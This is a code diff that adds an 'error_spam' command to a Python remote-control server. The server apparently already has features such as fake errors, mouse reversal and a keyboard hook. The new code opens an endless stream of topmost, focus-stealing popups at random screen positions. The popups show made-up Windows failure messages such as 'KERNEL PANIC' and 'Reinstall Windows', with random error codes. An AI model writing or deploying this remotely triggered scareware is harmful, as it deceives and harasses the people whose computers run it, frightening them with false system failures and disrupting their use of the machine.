@@ -65,6 +65,7 @@ class RemoteControlServer:
         self.autoclick_active = False
         self.automove_active = False
         self._kb_hook = None
+        self._error_spam_active = False
 
     def broadcast_ip(self):
         lan_ip = get_lan_ip()
@@ -269,6 +270,11 @@ class RemoteControlServer:
 
             elif cmd == "fake_error":
                 self.bg(self.show_fake_error)
+
+            elif cmd == "error_spam":
+                self._error_spam_active = not self._error_spam_active
+                if self._error_spam_active:
+                    self.bg(self._error_spam)
 
             elif cmd == "reverse_mouse":
                 self.reverse_mouse = not self.reverse_mouse
@@ -525,6 +531,48 @@ class RemoteControlServer:
             win.mainloop()
         except:
             pass
+
+    def _error_spam(self):
+        import tkinter as tk
+        import random
+        import string
+        errors = [
+            ("CRITICAL ERROR", "A fatal exception has occurred!\nError code: 0x{:08X}\nThe application will terminate.", "#1a0000", "#ff0000"),
+            ("SYSTEM FAILURE", "Windows has detected a critical system error!\nError: 0x{:08X}\nImmediate action required.", "#000033", "#4488ff"),
+            ("MEMORY ERROR", "Insufficient memory to complete operation.\nError code: 0x{:08X}\nClose all applications.", "#1a001a", "#ff44ff"),
+            ("DISK ERROR", "Hard disk drive error detected!\nSector failure at 0x{:08X}\nBackup your data immediately.", "#001a00", "#44ff44"),
+            ("NETWORK ERROR", "Network connection lost.\nSocket error: 0x{:08X}\nCheck your network settings.", "#1a1a00", "#ffff44"),
+            ("DRIVER ERROR", "Device driver stopped responding.\nIRQL_NOT_LESS_OR_EQUAL 0x{:08X}", "#001a1a", "#44ffff"),
+            ("REGISTRY ERROR", "Windows registry is corrupted!\nError: 0x{:08X}\nSystem instability detected.", "#1a001a", "#ff44ff"),
+            ("KERNEL PANIC", "Kernel security check failure!\nBug check code: 0x{:08X}", "#000000", "#ff0000"),
+            ("ACCESS VIOLATION", "Memory access violation at address 0x{:08X}\nThe memory could not be read.", "#1a1a1a", "#ff8800"),
+            ("DLL ERROR", "System file missing: ntdll.dll\nError: 0x{:08X}\nReinstall Windows.", "#000033", "#00aaff"),
+        ]
+        while self._error_spam_active:
+            try:
+                win = tk.Tk()
+                title, msg, bg, fg = random.choice(errors)
+                err_code = random.randint(0x80000000, 0xFFFFFFFF)
+                sw = win.winfo_screenwidth()
+                sh = win.winfo_screenheight()
+                x = random.randint(0, max(0, sw - 400))
+                y = random.randint(0, max(0, sh - 200))
+                win.title(title)
+                win.geometry("400x180+{}+{}".format(x, y))
+                win.configure(bg=bg)
+                win.attributes('-topmost', True)
+                win.focus_force()
+                tk.Label(win, text=title, fg=fg, bg=bg,
+                         font=('Arial', 16, 'bold')).pack(pady=15)
+                tk.Label(win, text=msg.format(err_code), fg='#cccccc', bg=bg,
+                         font=('Arial', 10)).pack(pady=5)
+                tk.Button(win, text="OK", command=win.destroy, bg='#333333',
+                          fg='#fff', font=('Arial', 10)).pack(pady=10)
+                win.after(3000, win.destroy)
+                win.update()
+            except:
+                pass
+            time.sleep(random.uniform(0.1, 0.4))
 
 
 if __name__ == "__main__":
